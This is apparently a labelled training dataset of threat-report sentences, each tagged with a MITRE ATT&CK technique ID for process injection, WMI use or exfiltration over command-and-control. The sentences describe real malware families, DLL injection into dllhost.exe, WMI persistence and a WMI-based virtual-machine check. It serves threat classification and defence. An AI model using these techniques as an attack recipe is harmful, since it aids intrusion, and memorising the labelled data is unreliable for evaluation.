,sentence,label_tec
984,"2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time",T1055
985,*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it,T1055
986,64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3,T1055
987,The loader will then inject a DLL backdoor into dllhost.exe,T1055
988,"FakeRun’s PDB string (D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",T1055
989,TClient is injected into dllhost.exe Malware Analysis  wab32res.dll (FakeRun loader) loads TClient,T1055
990,"Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services",T1055
991,"20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",T1055
992,"Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3",T1055
993,The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command,T1055
994,"After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",T1055
995,It’s also used to inject code into its target processes using the technique.,T1055
996,"wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)",T1047
997,This utility is able to execute complicated WQL queries and WMI methods,T1047
998,"Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information",T1047
999,POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI),T1047
1000,POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI,T1047
1001,Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000,T1047
1002,"WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",T1047
1003,"Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory",T1047
1004,WMI classes are the primary structure within WMI,T1047
1005,WMI permanent event subscriptions can be used to trigger actions when specified conditions are met,T1047
1006,"Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding",T1047
1007,"WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",T1047
1008,APT29 then created a WMI event subscription in order to execute the backdoor,T1047
1009,"In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",T1047
1010,"This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",T1047
1011,This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations,T1047
1012,The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.,T1047
1013,Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\CIMV2” namespace,T1047
1014,The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment,T1047
1015,"Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan",T1047
1016,This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query,T1047
1017,Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality,T1047
1018,Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI,T1047
1019,WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators,T1047
1020,"This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators",T1047
1021,Most of the PowerShell commands would call Windows Management Instrumentation (WMI),T1047
1022,"This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.    The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment",T1041
1023,"Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports – randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure",T1041
